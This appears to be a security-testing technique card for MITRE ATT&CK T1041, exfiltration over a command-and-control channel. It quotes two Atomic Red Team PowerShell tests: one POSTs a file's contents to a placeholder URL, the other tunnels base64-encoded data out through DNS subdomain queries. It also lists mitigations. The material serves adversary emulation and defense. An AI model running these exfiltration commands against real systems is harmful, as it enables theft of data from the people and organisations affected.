---
name: "T1041_exfiltration-over-c2-channel"
description: "Adversaries may steal data by exfiltrating it over an existing command and control channel."
category: "client-side"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1041
  - exfiltration
  - esxi
  - linux
  - macos
  - windows
technique_id: "T1041"
tactic: "exfiltration"
all_tactics:
  - exfiltration
platforms:
  - ESXi
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1041"
tech_stack:
  - esxi
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-200
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1041 Exfiltration Over C2 Channel

## High-Level Description

Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.

## Kill Chain Phase

- Exfiltration (TA0010)

**Platforms:** ESXi, Linux, macOS, Windows

## What to Check

- [ ] Identify if Exfiltration Over C2 Channel technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Exfiltration Over C2 Channel
- [ ] Check Linux systems for indicators of Exfiltration Over C2 Channel
- [ ] Check macOS systems for indicators of Exfiltration Over C2 Channel
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: C2 Data Exfiltration

Exfiltrates a file present on the victim machine to the C2 server.

**Supported Platforms:** windows

```powershell
if(-not (Test-Path #{filepath})){ 
  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
}
[System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path #{filepath}
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
```

### Atomic Test 2: Text Based Data Exfiltration using DNS subdomains

Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.

**Supported Platforms:** windows

```powershell
$dnsServer = "#{dns_server}"
$exfiltratedData = "#{exfiltrated_data}"
$chunkSize = #{chunk_size}

$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
$encodedData = [Convert]::ToBase64String($encodedData)
$chunks = $encodedData -split "(.{$chunkSize})"

foreach ($chunk in $chunks) {
    $dnsQuery = $chunk + "." + $dnsServer
    Resolve-DnsName -Name $dnsQuery
    Start-Sleep -Seconds 5
}
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Exfiltration Over C2 Channel by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1041 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1031 Network Intrusion Prevention
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.

### M1057 Data Loss Prevention
Data loss prevention can detect and block sensitive data being sent over unencrypted protocols.


## Detection

### Detection Strategy for Exfiltration Over C2 Channel


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Exfiltration Over C2 Channel technique applicable | Low | Exfiltration |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-200 | Exposure of Sensitive Information |


## References

- [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
- [Atomic Red Team - T1041](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1041)
- [MITRE ATT&CK - T1041](https://attack.mitre.org/techniques/T1041)
